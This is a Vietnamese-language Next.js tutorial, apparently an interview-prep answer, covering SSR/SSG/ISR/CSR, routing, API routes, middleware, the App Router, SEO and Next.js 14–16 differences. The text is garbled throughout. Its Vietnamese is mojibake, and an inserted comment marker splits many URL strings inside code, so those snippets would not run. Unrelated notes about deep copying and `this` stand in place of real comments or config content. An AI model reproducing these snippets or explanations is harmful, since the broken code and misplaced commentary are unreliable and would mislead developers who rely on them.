  const data = await res.json();
  
  return {
    props: { data }, // Ch√∫ gi·∫£i: Passed to page component
  };
}

function Page({ data }) {
  return <div>{data.title}</div>;
}

// ‚úÖ Khi n√†o d√πng: Data thay ƒë·ªïi th∆∞·ªùng xuy√™n, c·∫ßn real-time
// ‚ö†Ô∏è Nh∆∞·ª£c ƒëi·ªÉm: Slower TTFB (Time To First Byte), server load cao

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: 2. SSG - Static Site Generation (build time)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: Generate HTML t·∫°i BUILD TIME ‚Üí Serve static files (c·ª±c nhanh)
export async function getStaticProps() {
  const res = await fetch('https: // Ch√∫ gi·∫£i: api.example.com/posts');
  const posts = await res.json();
  
  return {
    props: { posts },
    revalidate: 60, // ISR: Re-generate m·ªói 60s n·∫øu c√≥ request
  };
}

 // Ch√∫ gi·∫£i: Dynamic routes v·ªõi SSG
export async function getStaticPaths() {
  const res = await fetch('https: // Ch√∫ gi·∫£i: api.example.com/posts');
  const posts = await res.json();
  
  const paths = posts.map(post => ({
    params: { id: post.id.toString() },
  }));
  
  return {
    paths, // Pre-render nh·ªØng paths n√†y
    fallback: 'blocking', // Ch√∫ gi·∫£i: 'blocking' | true | false
  };
}

// ‚úÖ Khi n√†o d√πng: Blog, docs, marketing pages (static content)
// ‚úÖ ∆Øu ƒëi·ªÉm: C·ª±c nhanh, CDN-friendly, t·ªët cho SEO

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: 3. ISR - Incremental Static Regeneration
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
export async function getStaticProps() {
  const data = await fetchData();
  
  return {
    props: { data },
    revalidate: 10, // Ch√∫ gi·∫£i: Re-generate page m·ªói 10s (stale-while-revalidate)
  };
}

 // Ch√∫ gi·∫£i: Flow:
 // Ch√∫ gi·∫£i: 1. Request ‚Üí Serve stale page (instant)
 // Ch√∫ gi·∫£i: 2. Background: Re-generate new page
 // Ch√∫ gi·∫£i: 3. Next request ‚Üí Serve fresh page
 // Ch√∫ gi·∫£i: ‚úÖ Best of both worlds: Static speed + Fresh data

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: 4. CSR - Client-Side Rendering
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
import useSWR from 'swr';

function Profile() {
  const { data, error } = useSWR('/api/user', fetcher);
  
  if (error) return <div>Failed to load</div>;
  if (!data) return <div>Loading...</div>;
  
  return <div>Hello {data.name}</div>;
}

// ‚úÖ Khi n√†o d√πng: Private pages, dashboards, user-specific data
// ‚ö†Ô∏è Nh∆∞·ª£c ƒëi·ªÉm: Kh√¥ng t·ªët cho SEO, slower initial load
```

**üìä So s√°nh Rendering Methods:**

| Method | Build Time | Request Time | SEO | Speed | Use Case |
|--------|-----------|--------------|-----|-------|----------|
| **SSG** | Generate HTML | Serve static | ‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê | Blog, docs |
| **ISR** | Generate HTML | Serve static + revalidate | ‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê | E-commerce |
| **SSR** | - | Generate HTML | ‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê | Real-time data |
| **CSR** | - | Fetch on client | ‚≠ê | ‚≠ê | Dashboards |

---

##### **1.2. File-Based Routing**

```typescript
 // Ch√∫ gi·∫£i: pages/index.tsx ‚Üí /
 // Ch√∫ gi·∫£i: pages/about.tsx ‚Üí /about
 // Ch√∫ gi·∫£i: pages/blog/[slug].tsx ‚Üí /blog/:slug (dynamic)
 // Ch√∫ gi·∫£i: pages/blog/[...slug].tsx ‚Üí /blog/* (catch-all)
 // Ch√∫ gi·∫£i: pages/api/hello.ts ‚Üí /api/hello (API route)

 // Ch√∫ gi·∫£i: Dynamic route example
 // Ch√∫ gi·∫£i: pages/posts/[id].tsx
import { useRouter } from 'next/router';

function Post() {
  const router = useRouter();
  const { id } = router.query; // Ch√∫ gi·∫£i: Get dynamic param
  
  return <div>Post: {id}</div>;
}

 // Ch√∫ gi·∫£i: Catch-all route: pages/docs/[...slug].tsx
 // Ch√∫ gi·∫£i: Matches: /docs/a, /docs/a/b, /docs/a/b/c
function Docs() {
  const router = useRouter();
  const { slug } = router.query; // Ch√∫ gi·∫£i: slug = ['a', 'b', 'c']
  
  return <div>Path: {slug?.join('/')}</div>;
}

 // Ch√∫ gi·∫£i: Programmatic navigation
const router = useRouter();
router.push('/about'); // Ch√∫ gi·∫£i: Client-side navigation
router.push({ pathname: '/post/[id]', query: { id: '1' } });
router.replace('/login'); // Ch√∫ gi·∫£i: Replace history
router.back(); // Ch√∫ gi·∫£i: Go back
```

---

##### **1.3. API Routes**

```typescript
 // Ch√∫ gi·∫£i: pages/api/user.ts
import type { NextApiRequest, NextApiResponse } from 'next';

type Data = {
  name: string;
};

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
 // Ch√∫ gi·∫£i: Method-based routing
  if (req.method === 'POST') {
 // Ch√∫ gi·∫£i: Handle POST
    const { name } = req.body;
    res.status(200).json({ name });
  } else {
 // Ch√∫ gi·∫£i: Handle GET
    res.status(200).json({ name: 'John Doe' });
  }
}

 // Ch√∫ gi·∫£i: Dynamic API route: pages/api/posts/[id].ts
export default function handler(req, res) {
  const { id } = req.query;
  res.status(200).json({ post: id });
}

 // Ch√∫ gi·∫£i: ‚úÖ Use cases: Backend logic, database queries, authentication
```

---

##### **1.4. Image Optimization**

```typescript
import Image from 'next/image';

 // Ch√∫ gi·∫£i: Automatic optimization, lazy loading, responsive
function Avatar() {
  return (
    <Image
      src="/me.png"
      alt="Picture"
      width={500}
      height={500}
      priority // Ch√∫ gi·∫£i: Load eagerly (above fold)
      placeholder="blur" // Ch√∫ gi·∫£i: Blur placeholder while loading
      blurDataURL="data:image/..." // Ch√∫ gi·∫£i: Custom blur
    />
  );
}

 // Ch√∫ gi·∫£i: External images
<Image
  src="https: // Ch√∫ gi·∫£i: example.com/photo.jpg"
  alt="Photo"
  width={800}
  height={600}
  loader={({ src, width, quality }) => {
    return `${src}?w=${width}&q=${quality || 75}`;
  }}
/>

 // Ch√∫ gi·∫£i: ‚úÖ Benefits:
 // Ch√∫ gi·∫£i: - Auto WebP/AVIF conversion
 // Ch√∫ gi·∫£i: - Lazy loading (viewport intersection)
 // Ch√∫ gi·∫£i: - Responsive images (srcset)
 // Ch√∫ gi·∫£i: - Prevent layout shift (width/height required)
```

---

#### **üìö PH·∫¶N 2: ADVANCED FEATURES**

##### **2.1. Middleware (Next.js 12+)**

```typescript
 // Ch√∫ gi·∫£i: middleware.ts (root level)
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

// Ch·∫°y TR∆Ø·ªöC request ƒë·∫øn page/API
export function middleware(request: NextRequest) {
 // Ch√∫ gi·∫£i: Authentication
  const token = request.cookies.get('token');
  
  if (!token && request.nextUrl.pathname.startsWith('/dashboard')) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
  
 // Ch√∫ gi·∫£i: A/B Testing
  const bucket = request.cookies.get('bucket') || Math.random() > 0.5 ? 'a' : 'b';
  const response = NextResponse.next();
  response.cookies.set('bucket', bucket);
  
  // Rewrite (thay ƒë·ªïi URL n·ªôi b·ªô)
  if (request.nextUrl.pathname === '/old-blog') {
    return NextResponse.rewrite(new URL('/blog', request.url));
  }
  
  return response;
}

 // Ch√∫ gi·∫£i: Ch·ªâ ch·∫°y cho specific paths
export const config = {
  matcher: ['/dashboard/:path*', '/api/:path*'],
};
```

---

##### **2.2. App Router (Next.js 13+ - New)**

```typescript
 // Ch√∫ gi·∫£i: app/layout.tsx - Root layout
export default function RootLayout({ children }) {
  return (
    <html>
      <body>{children}</body>
    </html>
  );
}

// app/page.tsx - Home page (Server Component m·∫∑c ƒë·ªãnh)
async function getData() {
  const res = await fetch('https: // Ch√∫ gi·∫£i: api.example.com/data');
  return res.json();
}

export default async function Page() {
  const data = await getData(); // Ch√∫ gi·∫£i: Async component!
  return <div>{data.title}</div>;
}

 // Ch√∫ gi·∫£i: app/dashboard/layout.tsx - Nested layout
export default function DashboardLayout({ children }) {
  return (
    <div>
      <Sidebar />
      {children}
    </div>
  );
}

 // Ch√∫ gi·∫£i: Client component (when needed)
'use client'; // Ch√∫ gi·∫£i: Directive

import { useState } from 'react';

export default function Counter() {
  const [count, setCount] = useState(0);
  return <button onClick={() => setCount(count + 1)}>{count}</button>;
}
```

---

##### **2.3. Data Fetching (App Router)**

```typescript
 // Ch√∫ gi·∫£i: Fetch with caching
async function getData() {
  const res = await fetch('https: // Ch√∫ gi·∫£i: api.example.com/data', {
    cache: 'force-cache', // Ch√∫ gi·∫£i: SSG-like (default)
  });
  return res.json();
}

 // Ch√∫ gi·∫£i: Revalidate every 10s (ISR)
async function getData() {
  const res = await fetch('https: // Ch√∫ gi·∫£i: api.example.com/data', {
    next: { revalidate: 10 },
  });
  return res.json();
}

 // Ch√∫ gi·∫£i: No caching (SSR-like)
async function getData() {
  const res = await fetch('https: // Ch√∫ gi·∫£i: api.example.com/data', {
    cache: 'no-store',
  });
  return res.json();
}

 // Ch√∫ gi·∫£i: Parallel data fetching
export default async function Page() {
  const [user, posts] = await Promise.all([
    fetch('/api/user').then(r => r.json()),
    fetch('/api/posts').then(r => r.json()),
  ]);
  
  return <div>{user.name} - {posts.length} posts</div>;
}
```

---

#### **üìö PH·∫¶N 3: SEO OPTIMIZATION**

##### **3.1. Metadata & SEO**

```typescript
 // Ch√∫ gi·∫£i: pages/index.tsx (Pages Router)
import Head from 'next/head';

export default function Home() {
  return (
    <>
      <Head>
        <title>My Page Title</title>
        <meta name="description" content="Page description" />
        <meta property="og:title" content="OG Title" />
        <meta property="og:description" content="OG Description" />
        <meta property="og:image" content="https: // Ch√∫ gi·∫£i: example.com/og.jpg" />
        <meta name="twitter:card" content="summary_large_image" />
        <link rel="canonical" href="https: // Ch√∫ gi·∫£i: example.com" />
      </Head>
      <h1>Home</h1>
    </>
  );
}

 // Ch√∫ gi·∫£i: app/page.tsx (App Router) - Metadata API
import type { Metadata } from 'next';

export const metadata: Metadata = {
  title: 'My Page Title',
  description: 'Page description',
  openGraph: {
    title: 'OG Title',
    description: 'OG Description',
    images: [{ url: 'https: // Ch√∫ gi·∫£i: example.com/og.jpg' }],
  },
  twitter: {
    card: 'summary_large_image',
  },
};

 // Ch√∫ gi·∫£i: Dynamic metadata
export async function generateMetadata({ params }): Promise<Metadata> {
  const product = await fetch(`/api/products/${params.id}`).then(r => r.json());
  
  return {
    title: product.name,
    description: product.description,
    openGraph: {
      images: [product.image],
    },
  };
}
```

---

##### **3.2. SEO Best Practices**

```typescript
 // Ch√∫ gi·∫£i: 1. Sitemap Generation (pages/api/sitemap.xml.ts)
export default function Sitemap() {
 // Ch√∫ gi·∫£i: Generate sitemap XML
}

 // Ch√∫ gi·∫£i: 2. robots.txt (public/robots.txt)
 // Ch√∫ gi·∫£i: User-agent: *
 // Ch√∫ gi·∫£i: Allow: /
 // Ch√∫ gi·∫£i: Sitemap: https://example.com/sitemap.xml

 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
<script
  type="application/ld+json"
  dangerouslySetInnerHTML={{
    __html: JSON.stringify({
      '@context': 'https: // Ch√∫ gi·∫£i: schema.org',
      '@type': 'Article',
      headline: 'Article Title',
      author: { '@type': 'Person', name: 'Author' },
    }),
  }}
/>

 // Ch√∫ gi·∫£i: 4. Image Alt Text
<Image src="/photo.jpg" alt="Descriptive alt text" width={500} height={500} />

 // Ch√∫ gi·∫£i: 5. Semantic HTML
<article>
  <h1>Title</h1>
  <p>Content</p>
</article>

 // Ch√∫ gi·∫£i: 6. Internal Linking
import Link from 'next/link';
<Link href="/about">About</Link> // Ch√∫ gi·∫£i: Prefetch on hover
```

---

#### **üìö PH·∫¶N 4: ∆ØU & NH∆Ø·ª¢C ƒêI·ªÇM**

**‚úÖ ∆Øu ƒëi·ªÉm:**

1. **SEO Excellent**: SSR/SSG ‚Üí Search engines index easily
2. **Performance**: Automatic code splitting, image optimization, font optimization
3. **Developer Experience**: Hot reload, TypeScript support, zero config
4. **Flexibility**: SSG, SSR, ISR, CSR - ch·ªçn per page
5. **Built-in Features**: Routing, API routes, image optimization, i18n
6. **Production Ready**: Vercel deployment, edge functions, analytics

**‚ö†Ô∏è Nh∆∞·ª£c ƒëi·ªÉm:**

1. **Learning Curve**: Nhi·ªÅu concepts (SSR, SSG, ISR, hydration)
2. **Opinionated**: File-based routing, specific structure
3. **Build Time**: SSG v·ªõi nhi·ªÅu pages ‚Üí long build time
4. **Server Costs**: SSR requires server (kh√¥ng th·ªÉ pure static hosting)
5. **Vendor Lock-in**: Best v·ªõi Vercel, other platforms c·∫ßn config th√™m
6. **Bundle Size**: Framework overhead (though optimized)

---

#### **üìö PH·∫¶N 5: PERFORMANCE OPTIMIZATION**

```typescript
 // Ch√∫ gi·∫£i: 1. Dynamic Imports (Code Splitting)
import dynamic from 'next/dynamic';

const DynamicComponent = dynamic(() => import('../components/Heavy'), {
  loading: () => <p>Loading...</p>,
  ssr: false, // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
});

 // Ch√∫ gi·∫£i: 2. Font Optimization
import { Inter } from 'next/font/google';

const inter = Inter({ subsets: ['latin'] });

export default function App({ Component, pageProps }) {
  return (
    <main className={inter.className}>
      <Component {...pageProps} />
    </main>
  );
}

 // Ch√∫ gi·∫£i: 3. Script Optimization
import Script from 'next/script';

<Script
  src="https: // Ch√∫ gi·∫£i: analytics.com/script.js"
  strategy="lazyOnload" // Ch√∫ gi·∫£i: afterInteractive | beforeInteractive | lazyOnload
/>

 // Ch√∫ gi·∫£i: 4. Streaming (App Router)
import { Suspense } from 'react';

export default function Page() {
  return (
    <Suspense fallback={<Loading />}>
      <SlowComponent />
    </Suspense>
  );
}
```

---

#### **üìö PH·∫¶N 6: NEXT.JS 14 vs 15 vs 16 - S·ª∞ KH√ÅC BI·ªÜT**

##### **6.1. Next.js 14 (October 2023)**

**üéØ Key Features:**

```typescript
 // Ch√∫ gi·∫£i: 1. Turbopack (Beta) - Faster dev server
 // Ch√∫ gi·∫£i: next.config.js
module.exports = {
  experimental: {
    turbo: {}, // Ch√∫ gi·∫£i: Opt-in Turbopack (5000+ tests passing)
  },
};

 // Ch√∫ gi·∫£i: 2. Server Actions (Stable)
 // Ch√∫ gi·∫£i: app/actions.ts
'use server';

export async function createPost(formData: FormData) {
  const title = formData.get('title');
  await db.posts.create({ title });
  revalidatePath('/posts');
}

 // Ch√∫ gi·∫£i: app/page.tsx
export default function Page() {
  return (
    <form action={createPost}>
      <input name="title" />
      <button type="submit">Create</button>
    </form>
  );
}

 // Ch√∫ gi·∫£i: 3. Partial Prerendering (Preview) - Hybrid SSR + Static
 // Ch√∫ gi·∫£i: Combines static shell + dynamic content
export const experimental_ppr = true; // Ch√∫ gi·∫£i: Per-route

 // Ch√∫ gi·∫£i: 4. Metadata Improvements
export const metadata = {
  metadataBase: new URL('https: // Ch√∫ gi·∫£i: example.com'),
  alternates: {
    canonical: '/',
    languages: { 'en-US': '/en-US', 'vi-VN': '/vi-VN' },
  },
};
```

**üìä Next.js 14 Highlights:**
- ‚úÖ Turbopack dev mode (53% faster)
- ‚úÖ Server Actions stable
- ‚úÖ Partial Prerendering preview
- ‚úÖ Improved `next/image`

---

##### **6.2. Next.js 15 (October 2024)**

**üéØ Key Features:**

```typescript
 // Ch√∫ gi·∫£i: 1. React 19 Support
 // Ch√∫ gi·∫£i: - React Compiler (automatic memoization)
 // Ch√∫ gi·∫£i: - New hooks: useFormStatus, useOptimistic
 // Ch√∫ gi·∫£i: - Server Components improvements

 // Ch√∫ gi·∫£i: 2. Async Request APIs (Breaking Change)
 // Ch√∫ gi·∫£i: Before (Next 14): Synchronous
import { cookies, headers } from 'next/headers';
const cookieStore = cookies();

 // Ch√∫ gi·∫£i: After (Next 15): Async
const cookieStore = await cookies();
const headersList = await headers();

 // Ch√∫ gi·∫£i: 3. Caching Behavior Changes
 // Ch√∫ gi·∫£i: Next 14: fetch() cached by default
 // Ch√∫ gi·∫£i: Next 15: fetch() NOT cached by default (opt-in caching)

 // Ch√∫ gi·∫£i: Opt-in caching
fetch('https: // Ch√∫ gi·∫£i: api.example.com', { cache: 'force-cache' });

 // Ch√∫ gi·∫£i: 4. Turbopack Dev (Stable)
 // Ch√∫ gi·∫£i: No longer experimental, default in development
 // Ch√∫ gi·∫£i: next.config.js - Auto-enabled

 // Ch√∫ gi·∫£i: 5. Hydration Error Improvements
 // Ch√∫ gi·∫£i: Better error messages with source code context
 // Ch√∫ gi·∫£i: Automatic suggestions for common issues

 // Ch√∫ gi·∫£i: 6. Static Route Indicator
 // Ch√∫ gi·∫£i: Dev overlay shows which routes are static/dynamic
 // Ch√∫ gi·∫£i: <NextIndicator /> shows route type

 // Ch√∫ gi·∫£i: 7. Form Submissions
import { useFormStatus } from 'react-dom';

function SubmitButton() {
  const { pending } = useFormStatus();
  return <button disabled={pending}>Submit</button>;
}
```

**üìä Next.js 15 Highlights:**
- ‚úÖ React 19 RC support
- ‚úÖ Async request APIs (breaking)
- ‚úÖ Caching opt-in (breaking)
- ‚úÖ Turbopack stable in dev
- ‚úÖ Better hydration errors
- ‚ö†Ô∏è Breaking changes from 14

---

##### **6.3. Next.js 16 (Expected Q1 2025)**

**üéØ Expected Features (Based on Roadmap):**

```typescript
 // Ch√∫ gi·∫£i: 1. Turbopack Build (Production)
 // Ch√∫ gi·∫£i: Currently dev-only, production builds will use Turbopack
 // Ch√∫ gi·∫£i: Faster builds, less memory usage

 // Ch√∫ gi·∫£i: 2. Partial Prerendering (Stable)
 // Ch√∫ gi·∫£i: pages/product/[id].tsx
export const experimental_ppr = true;

export default async function Product({ params }) {
 // Ch√∫ gi·∫£i: Static shell renders immediately
  return (
    <div>
      <h1>Product {params.id}</h1>
      
      {/* Dynamic content loads after */}
      <Suspense fallback={<Skeleton />}>
        <ProductDetails id={params.id} />
      </Suspense>
      
      <Suspense fallback={<Skeleton />}>
        <Reviews id={params.id} />
      </Suspense>
    </div>
  );
}

 // Ch√∫ gi·∫£i: 3. Enhanced React Compiler Integration
 // Ch√∫ gi·∫£i: Auto-optimize components without manual memo/useCallback
function Component({ items }) {
 // Ch√∫ gi·∫£i: Automatically optimized by React Compiler
  const filtered = items.filter(item => item.active);
  return <List items={filtered} />;
}

 // Ch√∫ gi·∫£i: 4. Improved Streaming
 // Ch√∫ gi·∫£i: Better support for streaming SSR
 // Ch√∫ gi·∫£i: Selective hydration improvements

 // Ch√∫ gi·∫£i: 5. Edge Runtime Enhancements
 // Ch√∫ gi·∫£i: More Node.js APIs available in Edge Runtime
 // Ch√∫ gi·∫£i: Better compatibility with existing packages
```

**üìä Next.js 16 Expected Features:**
- ‚úÖ Turbopack production builds
- ‚úÖ PPR stable (game-changer for performance)
- ‚úÖ React Compiler default
- ‚úÖ Better streaming & hydration
- ‚úÖ Edge Runtime maturity

---

##### **6.4. Comparison Table: Next.js 14 vs 15 vs 16**

| Feature | Next.js 14 | Next.js 15 | Next.js 16 (Expected) |
|---------|-----------|-----------|---------------------|
| **React Version** | 18 | 19 RC | 19 Stable |
| **Turbopack Dev** | Beta | ‚úÖ Stable | ‚úÖ Stable |
| **Turbopack Build** | ‚ùå | ‚ùå | ‚úÖ Stable |
| **Server Actions** | ‚úÖ Stable | ‚úÖ Stable | ‚úÖ Enhanced |
| **PPR** | Preview | Experimental | ‚úÖ Stable |
| **Request APIs** | Sync | ‚ö†Ô∏è Async (breaking) | Async |
| **Caching** | Default ON | ‚ö†Ô∏è Default OFF (breaking) | Opt-in |
| **React Compiler** | ‚ùå | Experimental | ‚úÖ Default |
| **Hydration Errors** | Basic | ‚úÖ Improved | Enhanced |
| **Edge Runtime** | Basic | Improved | ‚úÖ Mature |

---

##### **6.5. Migration Guide: 14 ‚Üí 15 ‚Üí 16**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: NEXT 14 ‚Üí 15 (Breaking Changes)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // Ch√∫ gi·∫£i: 1. Update async request APIs
 // Ch√∫ gi·∫£i: Before (14)
import { cookies } from 'next/headers';
const cookieStore = cookies();

 // Ch√∫ gi·∫£i: After (15)
const cookieStore = await cookies();

 // Ch√∫ gi·∫£i: 2. Update caching behavior
 // Ch√∫ gi·∫£i: Before (14) - cached by default
fetch('https: // Ch√∫ gi·∫£i: api.example.com');

 // Ch√∫ gi·∫£i: After (15) - opt-in caching
fetch('https: // Ch√∫ gi·∫£i: api.example.com', { cache: 'force-cache' });

 // Ch√∫ gi·∫£i: 3. Update next.config.js
 // Ch√∫ gi·∫£i: Remove experimental turbo flag (now default)
module.exports = {
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
};

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: NEXT 15 ‚Üí 16 (Expected Changes)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // Ch√∫ gi·∫£i: 1. Enable PPR for production
export const experimental_ppr = true; // Ch√∫ gi·∫£i: Becomes stable

 // Ch√∫ gi·∫£i: 2. Remove manual optimizations (React Compiler handles)
 // Ch√∫ gi·∫£i: Before (15)
const memoized = useMemo(() => compute(data), [data]);
const callback = useCallback(() => handleClick(), []);

 // Ch√∫ gi·∫£i: After (16) - Compiler auto-optimizes
const memoized = compute(data); // Ch√∫ gi·∫£i: Auto-memoized
const callback = () => handleClick(); // Ch√∫ gi·∫£i: Auto-memoized

 // Ch√∫ gi·∫£i: 3. Turbopack production builds
 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
{
  "scripts": {
    "build": "next build" // Ch√∫ gi·∫£i: Uses Turbopack automatically
  }
}
```

---

##### **6.6. Khi n√†o n√™n upgrade?**

**üìå Next.js 14:**
- ‚úÖ Production-ready, stable
- ‚úÖ Good for existing projects
- ‚úÖ Server Actions stable
- ‚ö†Ô∏è Will need migration to 15 eventually

**üìå Next.js 15:**
- ‚úÖ Latest stable (as of Oct 2024)
- ‚úÖ React 19 RC support
- ‚úÖ Better DX (Turbopack, hydration errors)
- ‚ö†Ô∏è Breaking changes from 14
- ‚ö†Ô∏è Caching behavior changes need attention

**üìå Next.js 16:**
- üîÆ Not released yet (Q1 2025)
- ‚úÖ Wait for: PPR stable, Turbopack build, React Compiler
- ‚ö†Ô∏è Early adoption may have bugs

**üí° Recommendation:**
- **New projects**: Next.js 15 (latest stable)
- **Existing projects**: Stay on 14 until 15.1+ (bug fixes)
- **Enterprise**: Wait for 15.2+ or LTS versions

---

#### **üéØ T√ìM T·∫ÆT Q40 - NEXT.JS**

**‚úÖ Core Features:**
- **Rendering**: SSR, SSG, ISR, CSR - ch·ªçn per page
- **Routing**: File-based, dynamic routes, API routes
- **Optimization**: Image, font, script automatic optimization
- **SEO**: Built-in metadata API, sitemap, structured data

**üí° SEO Techniques:**
1. SSR/SSG cho better indexing
2. Metadata API (title, description, OG tags)
3. Structured data (JSON-LD)
4. Image optimization v·ªõi alt text
5. Sitemap & robots.txt
6. Internal linking v·ªõi Link component

**üöÄ Khi n√†o d√πng Next.js:**
- C·∫ßn SEO (blog, e-commerce, marketing)
- Performance-critical apps
- Full-stack React apps (API routes)
- Static sites v·ªõi dynamic features

---
---
